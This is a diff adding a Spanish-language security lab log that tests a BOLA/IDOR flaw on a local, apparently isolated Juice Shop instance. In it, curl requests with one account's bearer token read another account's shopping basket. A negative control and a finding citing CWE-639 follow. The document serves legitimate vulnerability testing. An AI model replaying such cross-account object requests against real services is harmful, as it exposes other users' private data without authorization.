@@ -1,0 +1,21 @@
+$ security/attacks/run.sh  —  A12 BOLA/IDOR entre dos cuentas (riesgo inherente)
+# Objetivo: http://127.0.0.1:3000  (instancia propia del laboratorio, aislada)
+
+[+] Cuenta A (victima)  : bola_a_1762286560@juice-sh.op   ->  cesta id 6  (UserId 26)
+[+] Cuenta B (atacante) : bola_b_1762286560@juice-sh.op   ->  cesta id 7  (UserId 27)
+
+# B solicita la cesta de A con SU PROPIO token (lectura de objeto de otro propietario)
+$ curl -s -H "Authorization: Bearer <token_de_B>" http://127.0.0.1:3000/rest/basket/6
+  HTTP/1.1 200 OK
+  {"status":"success","data":{"id":6,"UserId":26,"Products":[...]}}      <-- cesta de A
+
+# Control negativo (sanity): B lee su propia cesta
+$ curl -s -H "Authorization: Bearer <token_de_B>" http://127.0.0.1:3000/rest/basket/7
+  HTTP/1.1 200 OK
+  {"status":"success","data":{"id":7,"UserId":27,...}}                   <-- cesta de B
+
+Esperado (si fuera seguro) : 401/403, o solo la cesta propia de B
+Observado                  : HTTP 200 con UserId 26 (!= 27) -> se leyo la cesta de A
+
+[VULNERABLE] A12 BOLA/IDOR   La app no verifica la propiedad del objeto (CWE-639 / OWASP API1:2023)
+   -> evidencia: evidence/fase-4/bola/ (resultado-bola.md, cross-read.json, own-read.json)
